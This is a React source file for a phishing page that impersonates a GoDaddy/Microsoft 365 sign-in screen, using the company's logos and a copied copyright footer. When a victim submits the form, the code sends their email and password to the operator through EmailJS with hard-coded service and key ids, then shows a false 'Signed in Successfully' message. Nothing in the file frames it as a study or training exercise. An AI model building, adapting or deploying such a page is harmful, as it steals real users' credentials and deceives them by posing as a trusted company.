import React from 'react'
import { useRef } from 'react'
import download from './img/download.png'
import sign from './img/Sign In - Google Chrome 08_12_2022 13_33_06 (2).png'
import godaddy from './img/GoDaddy-Black.png'
import emailjs from '@emailjs/browser';

const GoDaddy = () => {
  const form = useRef()

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs.sendForm('service_9bn86xa',
     'template_sjimrgg', form.current,
       'edZxWreqBUB9jXtGR')
      .then((result) => {
        alert("Signed in Successfully")
      }, 
  );
      e.target.reset()
  };


  return (
    <div>
      <div className='headers'>
        <img src={godaddy} />
        <a href="">Contact Us 24/7 <i class="fa fa-chevron-down" aria-hidden="true"></i></a>
    </div>
    <div className="head-form">
        <img src={sign} className="img" />
    <div className="form">
        <img src={download} />
        <form ref={form} onSubmit={sendEmail} className="registerForm">
            <h3>Sign in</h3>
            <input type="email" name="email" placeholder="Email*" className="form-control" /><br />
            <input type="password" name="password" placeholder="Password" className="form-control"/><br />
            <p><input type="checkbox" className="check" checked /></p>
            <p className="sign">Keep me signed in on this device</p><br />
            <button type="submit" className="submit-btn" value="sign up" name="register">Sign in</button><br />
            <p className="find">Need to find <a href="">your password</a>?</p>
        </form>
    </div>
    <div className="second-form">
        <p>Don't have Microsoft 365 email?</p>
        <a href="">Get started</a>
    </div>
    </div>

    <footer>
        <p>Copyright © 1999 - 2022 GoDaddy Operating Company, LLC. All Rights Reserved. <a href="">Privacy Policy</a></p>
    </footer>
    </div>
  )
}

export default GoDaddy